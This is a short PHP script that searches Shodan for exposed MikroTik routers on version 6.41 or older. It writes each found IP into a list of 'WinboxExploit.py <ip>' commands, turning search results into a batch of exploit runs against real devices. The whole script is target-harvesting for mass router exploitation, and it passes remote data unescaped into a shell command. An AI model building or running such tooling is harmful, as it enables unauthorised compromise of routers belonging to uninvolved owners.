<?php 

$apiKey = "SHODAN-API-KEY"; // if you want use api you must register on https://www.shodan.io and paste it here.
$shodanQuery = "mikrotik+v6.41"; // default mikrotik+v6.41 u can use versions older than 

$ch = curl_init("https://api.shodan.io/shodan/host/search?key=".$apiKey."&query=".$shodanQuery."");

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$json = curl_exec($ch);

$encoded = json_decode($json, true);

for ($i = 0; $i < count($encoded['matches']); $i++) {
    system("echo '"."WinboxExploit.py ".$encoded['matches']["$i"]['ip_str']."' >> results.txt");
}
